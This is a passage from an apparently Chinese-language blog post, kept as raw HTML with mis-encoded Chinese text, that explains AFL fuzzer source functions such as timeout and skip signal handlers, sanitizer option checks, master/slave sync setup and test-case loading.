class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">handle_timeout</span><span class="params">(<span class="type">int</span> sig)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (child_pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    child_timed_out = <span class="number">1</span>; </span><br><span class="line">    <span class="built_in">kill</span>(child_pid, SIGKILL);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (child_pid == <span class="number">-1</span> &amp;&amp; forksrv_pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    child_timed_out = <span class="number">1</span>; </span><br><span class="line">    <span class="built_in">kill</span>(forksrv_pid, SIGKILL);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>è®¾ç½®child_timed_outæ ‡å¿—ï¼Œè¡¨ç¤ºç›®æ ‡ç¨‹åºæ‰§è¡Œè¶…æ—¶</p></li><li><p>å¼ºåˆ¶ç»ˆæ­¢è¶…æ—¶çš„å­è¿›ç¨‹</p></li><li><p>å“åº”SIGALRMä¿¡å·ï¼Œç”¨äºæ‰§è¡Œæ—¶é—´é™åˆ¶æ§åˆ¶</p></li></ul><h5 id="handle-skipreq"><a href="#handle-skipreq" class="headerlink" title="handle_skipreq"></a>handle_skipreq</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">handle_skipreq</span><span class="params">(<span class="type">int</span> sig)</span> </span>&#123;</span><br><span class="line">  skip_requested = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>è®¾ç½®skip_requestedæ ‡å¿—ï¼Œå…è®¸è·³è¿‡å½“å‰æµ‹è¯•ç”¨ä¾‹</p></li><li><p>å“åº”SIGUSR1ä¿¡å·ï¼Œæä¾›æ‰‹åŠ¨å¹²é¢„æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹çš„èƒ½åŠ›</p></li></ul><h5 id="å¿½ç•¥çš„ä¿¡å·"><a href="#å¿½ç•¥çš„ä¿¡å·" class="headerlink" title="å¿½ç•¥çš„ä¿¡å·"></a>å¿½ç•¥çš„ä¿¡å·</h5><ul><li><p>SIGTSTPï¼ˆCtrl+Zï¼‰ï¼šé˜²æ­¢AFLè¢«æŒ‚èµ·</p></li><li><p>SIGPIPEï¼ˆç®¡é“ç ´è£‚ï¼‰ï¼šé˜²æ­¢åœ¨å†™å…¥å·²å…³é—­çš„ç®¡é“æ—¶ç¨‹åºç»ˆæ­¢</p></li></ul><h4 id="check-asan-opts"><a href="#check-asan-opts" class="headerlink" title="check_asan_opts"></a>check_asan_opts</h4><p>ç”¨äºéªŒè¯å†…å­˜å®‰å…¨å·¥å…·çš„ç¯å¢ƒå˜é‡é…ç½®æ˜¯å¦ç¬¦åˆè¦æ±‚ã€‚è¿™ä¸ªå‡½æ•°ä¸»è¦æ£€æŸ¥ASANï¼ˆAddressSanitizerï¼‰å’ŒMSANï¼ˆMemorySanitizerï¼‰çš„é…ç½®é€‰é¡¹ï¼Œç¡®ä¿å®ƒä»¬ä»¥æœ€é€‚åˆæ¨¡ç³Šæµ‹è¯•çš„æ–¹å¼è®¾ç½®ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">check_asan_opts</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  u8* x = <span class="built_in">getenv</span>(<span class="string">&quot;ASAN_OPTIONS&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (x) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;abort_on_error=1&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom ASAN_OPTIONS set without abort_on_error=1 - please fix!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;symbolize=0&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom ASAN_OPTIONS set without symbolize=0 - please fix!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  x = <span class="built_in">getenv</span>(<span class="string">&quot;MSAN_OPTIONS&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (x) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;exit_code=&quot;</span> <span class="built_in">STRINGIFY</span>(MSAN_ERROR)))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom MSAN_OPTIONS set without exit_code=&quot;</span></span><br><span class="line">            <span class="built_in">STRINGIFY</span>(MSAN_ERROR) <span class="string">&quot; - please fix!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;symbolize=0&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom MSAN_OPTIONS set without symbolize=0 - please fix!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AFLè¦æ±‚ASANï¼ˆAddressSanitizerï¼‰é…ç½®åŒ…å«ä»¥ä¸‹é€‰é¡¹ï¼š</p><p><code>abort_on_error=1</code></p><ul><li><p>åŠŸèƒ½ï¼šå½“ASANæ£€æµ‹åˆ°å†…å­˜é”™è¯¯æ—¶ç«‹å³ç»ˆæ­¢ç¨‹åº</p></li><li><p>é‡è¦æ€§ï¼šç¡®ä¿AFLèƒ½å¤Ÿæ•è·åˆ°å´©æºƒï¼Œè€Œä¸æ˜¯è®©ç¨‹åºç»§ç»­æ‰§è¡Œ</p></li><li><p>å¦‚æœç¼ºå°‘ï¼šAFLä¼šæ˜¾ç¤ºè‡´å‘½é”™è¯¯å¹¶ç»ˆæ­¢</p></li></ul><p><code>symbolize=0</code></p><ul><li><p>åŠŸèƒ½ï¼šç¦ç”¨ASANçš„ç¬¦å·åŒ–é”™è¯¯æŠ¥å‘Š</p></li><li><p>é‡è¦æ€§ï¼šé˜²æ­¢ASANç”Ÿæˆè¯¦ç»†çš„é”™è¯¯æŠ¥å‘Šï¼Œè¿™ä¼šå¹²æ‰°AFLçš„å´©æºƒæ£€æµ‹æœºåˆ¶</p></li><li><p>å¦‚æœç¼ºå°‘ï¼šAFLä¼šæ˜¾ç¤ºè‡´å‘½é”™è¯¯å¹¶ç»ˆæ­¢</p></li></ul><p>å¯¹äºMSANï¼ˆMemorySanitizerï¼‰ï¼ŒAFLè¦æ±‚ï¼š</p><p><code>exit_code=MSAN_ERROR</code></p><ul><li><p>åŠŸèƒ½ï¼šè®¾ç½®MSANæ£€æµ‹åˆ°é”™è¯¯æ—¶çš„é€€å‡ºä»£ç ä¸ºç‰¹å®šå€¼ï¼ˆMSAN_ERRORï¼‰</p></li><li><p>é‡è¦æ€§ï¼šå…è®¸AFLå‡†ç¡®è¯†åˆ«ç”±æœªåˆå§‹åŒ–å†…å­˜ä½¿ç”¨å¯¼è‡´çš„å´©æºƒ</p></li><li><p>å¦‚æœç¼ºå°‘ï¼šAFLä¼šæ˜¾ç¤ºè‡´å‘½é”™è¯¯å¹¶ç»ˆæ­¢</p></li></ul><p><code>symbolize=0</code></p><ul><li><p>åŠŸèƒ½ï¼šä¸ASANç›¸åŒï¼Œç¦ç”¨ç¬¦å·åŒ–é”™è¯¯æŠ¥å‘Š</p></li><li><p>é‡è¦æ€§ï¼šç¡®ä¿é”™è¯¯æŠ¥å‘Šä¸ä¼šå¹²æ‰°AFLçš„å´©æºƒæ£€æµ‹</p></li><li><p>å¦‚æœç¼ºå°‘ï¼šAFLä¼šæ˜¾ç¤ºè‡´å‘½é”™è¯¯å¹¶ç»ˆæ­¢</p></li></ul><p>å½“ä½¿ç”¨AFLä¸ASAN&#x2F;MSANä¸€èµ·è¿›è¡Œæ¨¡ç³Šæµ‹è¯•æ—¶ï¼Œåº”è¯¥è®¾ç½®ä»¥ä¸‹ç¯å¢ƒå˜é‡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export ASAN_OPTIONS=abort_on_error=1:symbolize=0:detect_leaks=0</span><br><span class="line">export MSAN_OPTIONS=exit_code=86:symbolize=0</span><br></pre></td></tr></table></figure><h4 id="fix-up-sync"><a href="#fix-up-sync" class="headerlink" title="fix_up_sync"></a>fix_up_sync</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">fix_up_sync</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  u8* x = sync_id;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode)</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;-S / -M and -n are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (skip_deterministic) &#123;</span><br><span class="line">    <span class="keyword">if</span> (force_deterministic)</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;use -S instead of -M -d&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;-S already implies -d&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (*x) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isalnum</span>(*x) &amp;&amp; *x != <span class="string">&#x27;_&#x27;</span> &amp;&amp; *x != <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Non-alphanumeric fuzzer ID specified via -S or -M&quot;</span>);</span><br><span class="line">    x++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strlen</span>(sync_id) &gt; <span class="number">32</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Fuzzer ID too long&quot;</span>);</span><br><span class="line"></span><br><span class="line">  x = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/%s&quot;</span>, out_dir, sync_id);</span><br><span class="line"></span><br><span class="line">  sync_dir = out_dir;</span><br><span class="line">  out_dir  = x;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!force_deterministic) &#123;</span><br><span class="line">    skip_deterministic = <span class="number">1</span>;</span><br><span class="line">    use_splicing = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»-ä»æ¨¡å¼ï¼š</p><ul><li><p>ä¸»èŠ‚ç‚¹(-M)ï¼šæ‰§è¡Œç¡®å®šæ€§æµ‹è¯•ï¼Œç³»ç»Ÿåœ°æ¢ç´¢è¾“å…¥ç©ºé—´</p></li><li><p>ä»èŠ‚ç‚¹(-S)ï¼šä¸“æ³¨äºéšæœºå˜å¼‚ï¼Œæé«˜è¦†ç›–ç‡å’Œå‘ç°ç‡</p></li></ul><p>å…±äº«å‘ç°ï¼š</p><ul><li><p>æ‰€æœ‰èŠ‚ç‚¹å…±äº«ä¸€ä¸ªé¡¶çº§åŒæ­¥ç›®å½•</p></li><li><p>æ¯ä¸ªèŠ‚ç‚¹å®šæœŸæ£€æŸ¥å…¶ä»–èŠ‚ç‚¹çš„å‘ç°</p></li><li><p>æœ‰è¶£çš„æµ‹è¯•ç”¨ä¾‹ä¼šè¢«æ‰€æœ‰èŠ‚ç‚¹é‡‡çº³</p></li></ul><p>å·¥ä½œåˆ†é…ï¼š</p><ul><li><p>ä¸»èŠ‚ç‚¹å¤„ç†è®¡ç®—å¯†é›†å‹çš„ç¡®å®šæ€§é˜¶æ®µ</p></li><li><p>ä»èŠ‚ç‚¹å¯ä»¥æ›´å¿«åœ°è¿›å…¥éšæœºå˜å¼‚é˜¶æ®µ</p></li><li><p>æ•´ä½“æé«˜äº†æ¨¡ç³Šæµ‹è¯•çš„æ•ˆç‡</p></li></ul><h4 id="save-cmdline-argc-argv"><a href="#save-cmdline-argc-argv" class="headerlink" title="save_cmdline(argc, argv);"></a>save_cmdline(argc, argv);</h4><p>è¯¥å‡½æ•°å°†å‘½ä»¤è¡Œå‚æ•°æ•°ç»„ï¼ˆargc&#x2F;argvï¼‰è½¬æ¢ä¸ºå•ä¸ªè¿ç»­çš„å­—ç¬¦ä¸²ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨å…¨å±€å˜é‡<code>orig_cmdline</code>ä¸­ï¼Œä»¥ä¾¿åœ¨ç¨‹åºçš„å…¶ä»–éƒ¨åˆ†ä½¿ç”¨ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Make a copy of the current command line. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">save_cmdline</span><span class="params">(u32 argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 len = <span class="number">1</span>, i;</span><br><span class="line">  u8* buf;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc; i++)</span><br><span class="line">    len += <span class="built_in">strlen</span>(argv[i]) + <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line">  buf = orig_cmdline = <span class="built_in">ck_alloc</span>(len);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc; i++) &#123;</span><br><span class="line"></span><br><span class="line">    u32 l = <span class="built_in">strlen</span>(argv[i]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(buf, argv[i], l);</span><br><span class="line">    buf += l;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i != argc - <span class="number">1</span>) *(buf++) = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="fix-up-banner-argv-optind"><a href="#fix-up-banner-argv-optind" class="headerlink" title="fix_up_banner(argv[optind]);"></a>fix_up_banner(argv[optind]);</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">fix_up_banner</span><span class="params">(u8* name)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!use_banner) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sync_id) &#123;</span><br><span class="line"></span><br><span class="line">      use_banner = sync_id;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">      u8* trim = <span class="built_in">strrchr</span>(name, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (!trim) use_banner = name; <span class="keyword">else</span> use_banner = trim + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strlen</span>(use_banner) &gt; <span class="number">40</span>) &#123;</span><br><span class="line"></span><br><span class="line">    u8* tmp = <span class="built_in">ck_alloc</span>(<span class="number">44</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%.40s...&quot;</span>, use_banner);</span><br><span class="line">    use_banner = tmp;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯aflç”¨æ¥è®¾ç½®æ¨ªå¹…ï¼ˆbannerï¼‰çš„å‡½æ•°</p><h4 id="check-if-tty"><a href="#check-if-tty" class="headerlink" title="check_if_tty()"></a>check_if_tty()</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if we&#x27;re on TTY. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">check_if_tty</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">winsize</span> ws;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_UI&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">OKF</span>(<span class="string">&quot;Disabling the UI because AFL_NO_UI is set.&quot;</span>);</span><br><span class="line">    not_on_tty = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">ioctl</span>(<span class="number">1</span>, TIOCGWINSZ, &amp;ws)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (errno == ENOTTY) &#123;</span><br><span class="line">      <span class="built_in">OKF</span>(<span class="string">&quot;Looks like we&#x27;re not running on a tty, so I&#x27;ll be a bit less verbose.&quot;</span>);</span><br><span class="line">      not_on_tty = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥æ˜¯å¦æ˜¯åœ¨ttyå³ç»ˆç«¯ä¸‹è¿è¡Œçš„å‡½æ•°</p><p>å‰©ä¸‹çš„å°±æŒ‘å‡ ä¸ªæœ‰ç‚¹æ„æ€çš„åˆ†æå§</p><h4 id="read-testcases"><a href="#read-testcases" class="headerlink" title="read_testcases"></a>read_testcases</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Read all testcases from the input directory, then queue them for testing.</span></span><br><span class="line"><span class="comment">   Called at startup. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">read_testcases</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">dirent</span> **nl;</span><br><span class="line">  s32 nl_cnt;</span><br><span class="line">  u32 i;</span><br><span class="line">  u8* fn;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Auto-detect non-in-place resumption attempts. */</span></span><br><span class="line"></span><br><span class="line">  fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/queue&quot;</span>, in_dir);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">access</span>(fn, F_OK)) in_dir = fn; <span class="keyword">else</span> <span class="built_in">ck_free</span>(fn);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ACTF</span>(<span class="string">&quot;Scanning &#x27;%s&#x27;...&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We use scandir() + alphasort() rather than readdir() because otherwise,</span></span><br><span class="line"><span class="comment">     the ordering  of test cases would vary somewhat randomly and would be</span></span><br><span class="line"><span class="comment">     difficult to control. */</span></span><br><span class="line"></span><br><span class="line">  nl_cnt = <span class="built_in">scandir</span>(in_dir, &amp;nl, <span class="literal">NULL</span>, alphasort);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nl_cnt &lt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (errno == ENOENT || errno == ENOTDIR)</span><br><span class="line"></span><br><span class="line">      <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;The input directory does not seem to be valid - try again. The fuzzer needs\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    one or more test case to start with - ideally, a small file under 1 kB\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    or so. The cases must be stored as regular files directly in the input\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    directory.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (shuffle_queue &amp;&amp; nl_cnt &gt; <span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ACTF</span>(<span class="string">&quot;Shuffling queue...&quot;</span>);</span><br><span class="line">    <span class="built_in">shuffle_ptrs</span>((<span class="type">void</span>**)nl, nl_cnt);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nl_cnt; i++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">stat</span> st;</span><br><span class="line"></span><br><span class="line">    u8* fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line">    u8* dfn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/.state/deterministic_done/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line"></span><br><span class="line">    u8  passed_det = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(nl[i]); <span class="comment">/* not tracked */</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">lstat</span>(fn, &amp;st) || <span class="built_in">access</span>(fn, R_OK))</span><br><span class="line">      <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to access &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This also takes care of . and .. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">S_ISREG</span>(st.st_mode) || !st.st_size || <span class="built_in">strstr</span>(fn, <span class="string">&quot;/README.testcases&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">ck_free</span>(fn);</span><br><span class="line">      <span class="built_in">ck_free</span>(dfn);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (st.st_size &gt; MAX_FILE) </span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Test case &#x27;%s&#x27; is too big (%s, limit is %s)&quot;</span>, fn,</span><br><span class="line">            <span class="built_in">DMS</span>(st.st_size), <span class="built_in">DMS</span>(MAX_FILE));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for metadata that indicates that deterministic fuzzing</span></span><br><span class="line"><span class="comment">       is complete for this entry. We don&#x27;t want to repeat deterministic</span></span><br><span class="line"><span class="comment">       fuzzing when resuming aborted scans, because it would be pointless</span></span><br><span class="line"><span class="comment">       and probably very time-consuming. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">access</span>(dfn, F_OK)) passed_det = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">ck_free</span>(dfn);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">add_to_queue</span>(fn, st.st_size, passed_det);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(nl); <span class="comment">/* not tracked */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!queued_paths) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">         <span class="string">&quot;Looks like there are no valid test cases in the input directory! The fuzzer\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    needs one or more test case to start with - ideally, a small file under\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    1 kB or so. The cases must be stored as regular files directly in the\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    input 